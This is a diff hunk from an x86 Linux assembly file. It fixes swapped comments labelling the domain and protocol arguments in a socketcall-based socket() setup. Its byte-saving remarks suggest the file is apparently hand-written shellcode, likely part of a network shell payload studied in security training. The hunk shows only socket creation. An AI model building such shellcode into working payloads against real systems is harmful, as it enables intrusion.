@@ -27,13 +27,13 @@ _start:
 	; Set up the socket() arguments in the stack (note the reverse order)
 	; Once finished, ESP will point to them.
 	xor ebx, ebx
-	push ebx	; domain = IPPROTO_IP (0)
+	push ebx	; protocol = IPPROTO_IP (0)
 	; Next instruction is leveraged both to set EBX to its desired value
 	; and to save one byte when setting up args (since push 0x01 would have
 	; used 2 bytes)
 	inc ebx		; EBX = SYS_SOCKET (1)
 	push ebx	; type = SOCK_STREAM (1)
-	push 0x02	; protocol = AF_INET (2)
+	push 0x02	; domain = AF_INET (2)
 	mov ecx, esp	; ECX = *args
 
 	int 0x80	; Exec syscall
